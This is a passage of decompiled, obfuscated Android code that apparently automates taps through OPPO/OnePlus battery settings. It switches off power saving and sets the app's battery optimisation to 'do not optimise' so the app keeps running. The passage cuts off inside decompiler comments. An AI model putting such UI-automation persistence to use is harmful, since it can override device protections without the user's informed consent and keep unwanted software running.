                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 7;
                                        if (c0368a52.m212314a9("省电设置", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 8;
                                            if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                c0368a52.m212315b2("自动进入省电模式");
                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 9;
                                                j = 100;
                                                if (c0368a52.m212354f9(100L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                    c0368a52.m212315b2("睡眠待机优化");
                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 10;
                                                    if (c0368a52.m212354f9(j, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 11;
                                                        if (c0368a52.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = null;
                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 12;
                                                            if (c0368a52.m212345e9(oppoStepsSimplified$mOnePlus$1) == coroutineSingletons) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    oppoStepsSimplified$mOnePlus$1.f54606a0 = this;
                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 13;
                    if (m212344e8(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                        c0368a5 = this;
                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 14;
                        if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 15;
                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                if (c0368a5.m212313a8("省电模式")) {
                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 16;
                                    str = "不优化";
                                    if (c0368a5.m212354f9(500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                        if (!c0368a5.m212313a8("立即关闭")) {
                                            m212303e0("✅ 点击[立即关闭]按钮");
                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 17;
                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 20;
                                                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 21;
                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                        if (!c0368a5.m212313a8("电池优化")) {
                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 22;
                                                            if (c0368a5.m212354f9(500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 23;
                                                                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                    String strM212334d7 = c0368a5.m212334d7();
                                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 24;
                                                                    i = 25;
                                                                    objM212314a9 = c0368a5.m212314a9(strM212334d7, 25, oppoStepsSimplified$mOnePlus$1);
                                                                    if (objM212314a9 != coroutineSingletons) {
                                                                        if (!((Boolean) objM212314a9).booleanValue()) {
                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = i;
                                                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                c0368a5.m212313a8(str);
                                                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 26;
                                                                                break;
                                                                            }
                                                                        } else {
                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 27;
                                                                            if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 28;
                                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                    if (c0368a5.m212313a8("高级设置") && !c0368a5.m212313a8("更多设置")) {
                                                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 29;
                                                                                        objM212314a92 = c0368a5.m212314a9("高级设置#更多设置", 3, oppoStepsSimplified$mOnePlus$1);
                                                                                        break;
                                                                                    } else {
                                                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 30;
                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                            c0368a5.m212315b2("睡眠待机优化");
                                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 31;
                                                                                            if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                if (!c0368a5.m212313a8("耗电异常优化")) {
                                                                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 32;
                                                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 33;
                                                                                                        if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                            String strM212334d72 = c0368a5.m212334d7();
                                                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 34;
                                                                                                            objM212314a93 = c0368a5.m212314a9(strM212334d72, 25, oppoStepsSimplified$mOnePlus$1);
                                                                                                            if (objM212314a93 != coroutineSingletons) {
                                                                                                                if (!((Boolean) objM212314a93).booleanValue()) {
                                                                                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 35;
                                                                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                        c0368a5.m212313a8(str);
                                                                                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 36;
                                                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 37;
                                                                                                                            if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                                oppoStepsSimplified$mOnePlus$1.f54609a3 = 38;
                                                                                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                                    oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                                    oppoStepsSimplified$mOnePlus$1.f54609a3 = 39;
                                                                                                                                    if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                                        oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                                                                                                        oppoStepsSimplified$mOnePlus$1.f54609a3 = 40;
                                                                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = null;
                                                                                                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 41;
                                                                                                                                            if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            m212303e0("⚠️ 未找到[电池优化]，跳过（部分机型无此功能）");
                                                            if (c0368a5.m212313a8("高级设置")) {
                                                            }
                                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 30;
                                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        } else if (c0368a5.m212315b2("立即开启")) {
                                            m212303e0("✅ 关闭[立即开启]开关");
                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 18;
                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                            }
                                        } else {
                                            c0368a5.m212315b2("省电模式");
                                            oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                                            oppoStepsSimplified$mOnePlus$1.f54609a3 = 19;
                                            if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                                            }
                                        }
                                    }
                                }
                                str = "不优化";
                                if (!c0368a5.m212313a8("电池优化")) {
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                kg1.m213544f4(obj);
                return c1351vv;
            case 2:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 3;
                if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 4;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                c0368a52.m212313a8("电池模式");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 5;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                c0368a52.m212313a8("均衡模式");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 6;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 7;
                if (c0368a52.m212314a9("省电设置", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 8;
                if (c0368a52.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                c0368a52.m212315b2("自动进入省电模式");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 9;
                j = 100;
                if (c0368a52.m212354f9(100L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                j = 100;
                c0368a52.m212315b2("睡眠待机优化");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 10;
                if (c0368a52.m212354f9(j, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a52;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 11;
                if (c0368a52.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                c0368a52 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = null;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 12;
                if (c0368a52.m212345e9(oppoStepsSimplified$mOnePlus$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                kg1.m213544f4(obj);
                return c1351vv;
            case 13:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 14;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 15;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                if (c0368a5.m212313a8("省电模式")) {
                }
                str = "不优化";
                if (!c0368a5.m212313a8("电池优化")) {
                }
                break;
            case 16:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                if (!c0368a5.m212313a8("立即关闭")) {
                }
                break;
            case 17:
            case 18:
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 20;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 20:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 21;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 21:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                if (!c0368a5.m212313a8("电池优化")) {
                }
                break;
            case 22:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 23;
                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 23:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                String strM212334d73 = c0368a5.m212334d7();
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 24;
                i = 25;
                objM212314a9 = c0368a5.m212314a9(strM212334d73, 25, oppoStepsSimplified$mOnePlus$1);
                if (objM212314a9 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                objM212314a9 = obj;
                str = "不优化";
                i = 25;
                if (!((Boolean) objM212314a9).booleanValue()) {
                }
                return coroutineSingletons;
            case 25:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                c0368a5.m212313a8(str);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 26;
                break;
            case 26:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                c0368a5.getClass();
                m212303e0("✅ 选择[不优化]");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 27;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 27:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 28;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 28:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                if (c0368a5.m212313a8("高级设置")) {
                }
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 30;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 29:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                objM212314a92 = obj;
                str = "不优化";
                if (((Boolean) objM212314a92).booleanValue()) {
                }
                return coroutineSingletons;
            case 30:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                c0368a5.m212315b2("睡眠待机优化");
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 31;
                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 31:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                if (!c0368a5.m212313a8("耗电异常优化")) {
                }
                return coroutineSingletons;
            case 32:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 33;
                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 33:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                String strM212334d722 = c0368a5.m212334d7();
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 34;
                objM212314a93 = c0368a5.m212314a9(strM212334d722, 25, oppoStepsSimplified$mOnePlus$1);
                if (objM212314a93 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 34:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                objM212314a93 = obj;
                str = "不优化";
                if (!((Boolean) objM212314a93).booleanValue()) {
                }
                return coroutineSingletons;
            case 35:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                str = "不优化";
                c0368a5.m212313a8(str);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 36;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 36:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 37;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 37:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 38;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 38:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 39;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 39:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = c0368a5;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 40;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 40:
                c0368a5 = oppoStepsSimplified$mOnePlus$1.f54606a0;
                kg1.m213544f4(obj);
                oppoStepsSimplified$mOnePlus$1.f54606a0 = null;
                oppoStepsSimplified$mOnePlus$1.f54609a3 = 41;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOnePlus$1) != coroutineSingletons) {
                }
                break;
            case 41:
                kg1.m213544f4(obj);
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:59:0x0155, code lost:
    
        if (r5.m212354f9(500, r3) != r4) goto L61;
     */
    /* JADX WARN: Code restructure failed: missing block: B:67:0x0193, code lost:
    
        if (r10.m212354f9(300, r3) == r4) goto L167;
     */
    /* JADX WARN: Removed duplicated region for block: B:107:0x028c A[PHI: r5
      0x028c: PHI (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v33 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v36 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:105:0x0288, B:32:0x00b8] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:110:0x029a A[PHI: r5
      0x029a: PHI (r5v37 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v35 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v38 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:108:0x0296, B:31:0x00b1] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x02aa A[PHI: r5
      0x02aa: PHI (r5v39 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v37 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v40 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:111:0x02a6, B:30:0x00aa] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:116:0x02b8 A[PHI: r5
      0x02b8: PHI (r5v41 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v39 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v42 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:114:0x02b4, B:29:0x00a3] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x02be  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x02d3 A[PHI: r5
      0x02d3: PHI (r5v43 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v41 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v44 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:120:0x02cf, B:28:0x009c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:124:0x02db  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x02f9 A[PHI: r5
      0x02f9: PHI (r5v47 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v45 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v48 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:128:0x02f5, B:26:0x008e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:133:0x030d A[PHI: r1 r5
      0x030d: PHI (r1v66 java.lang.Object) = (r1v65 java.lang.Object), (r1v1 java.lang.Object) binds: [B:131:0x0309, B:25:0x0087] A[DONT_GENERATE, DONT_INLINE]
      0x030d: PHI (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v47 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v50 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:131:0x0309, B:25:0x0087] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0315  */
    /* JADX WARN: Removed duplicated region for block: B:141:0x0336 A[PHI: r5
      0x0336: PHI (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r5v43 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v49 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v51 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r5v54 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:123:0x02d9, B:134:0x0313, B:139:0x0332, B:23:0x0079] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:144:0x0344 A[PHI: r5
      0x0344: PHI (r5v55 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v53 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v56 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:142:0x0340, B:22:0x0072] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:147:0x0351 A[PHI: r5
      0x0351: PHI (r5v57 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v55 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v58 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:145:0x034e, B:21:0x006b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:150:0x035e A[PHI: r5
      0x035e: PHI (r5v59 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v57 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v60 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:148:0x035b, B:20:0x0064] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:153:0x036b A[PHI: r5
